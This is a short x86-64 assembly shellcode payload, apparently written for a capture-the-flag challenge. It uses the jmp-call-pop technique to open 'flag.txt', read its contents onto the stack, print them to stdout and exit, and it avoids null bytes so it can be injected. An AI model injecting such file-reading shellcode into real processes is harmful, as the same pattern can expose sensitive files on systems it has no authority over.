[section .text]
	global _start

_start:
	jmp short handle

printme:
	pop rdi
	xor rax, rax
	add al, 0x2
	xor rsi, rsi
	syscall

	mov rdi, rax
	lea rsi, [rsp]
	xor rdx, rdx
	mov dx, 0xfff
	xor rax, rax
	syscall

	xor rdi, rdi
	mov dil, 0x1
	mov rdx, rax
	xor rax, rax
	mov al, 0x1
	syscall

	xor rax,rax
	mov al, 0x3c
	syscall
handle:
	call printme
	db "flag.txt"
